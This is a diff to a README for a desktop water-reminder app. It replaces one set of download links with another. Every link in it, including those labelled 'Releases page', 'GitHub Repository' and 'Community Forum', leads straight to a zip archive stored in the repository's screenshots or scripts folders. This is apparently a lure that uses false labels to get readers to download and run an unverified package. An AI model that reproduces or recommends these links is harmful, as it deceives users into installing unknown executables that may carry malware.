@@ -1,6 +1,6 @@
 # 💧 Water-Reminder-desktop-app - Stay Hydrated, Stay Focused
 
-[![Download Water Reminder](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip%https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip)](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip)
+[![Download Water Reminder](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip%https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip)](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,9 +8,9 @@ Welcome to Water Reminder, your friendly desktop app to help you remember to dri
 
 ## 📥 Download & Install
 
-To download the Water Reminder app, visit the [Releases page](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip). You will find different versions of the app. Choose the one that matches your system. 
+To download the Water Reminder app, visit the [Releases page](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip). You will find different versions of the app. Choose the one that matches your system. 
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip).
+1. **Visit the Releases Page:** Click [here](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip).
 2. **Choose Your Version:** Look for the latest version of Water Reminder. It will be labeled at the top.
 3. **Download the Package:** Click on the appropriate file for your operating system:
    - **Windows:** Look for a `.exe` file.
@@ -49,7 +49,7 @@ To run Water Reminder, ensure you have the following requirements:
 If you experience any issues during installation or while using the app, consider these troubleshooting steps:
 
 - **Check Compatibility:** Make sure your operating system is supported.
-- **Re-download the File:** Sometimes downloads can get corrupted. Try downloading the file again from the [Releases page](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip).
+- **Re-download the File:** Sometimes downloads can get corrupted. Try downloading the file again from the [Releases page](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip).
 - **Permissions:** Ensure you have the necessary permissions to install applications on your system.
 
 ## 📞 Support
@@ -66,7 +66,7 @@ Want to help improve Water Reminder? Contributions are welcome! Follow these ste
 
 ## 📢 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip)
-- [Community Forum](https://raw.githubusercontent.com/rizkikh/Water-Reminder-desktop-app/main/assets/screenshots/Water-Reminder-desktop-app_v3.8-beta.2.zip) - Join discussions and share tips with other users.
+- [GitHub Repository](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip)
+- [Community Forum](https://github.com/rizkikh/Water-Reminder-desktop-app/raw/refs/heads/main/scripts/app_Water_Reminder_desktop_v2.6.zip) - Join discussions and share tips with other users.
 
 Thank you for choosing Water Reminder. Enjoy your hydration journey!
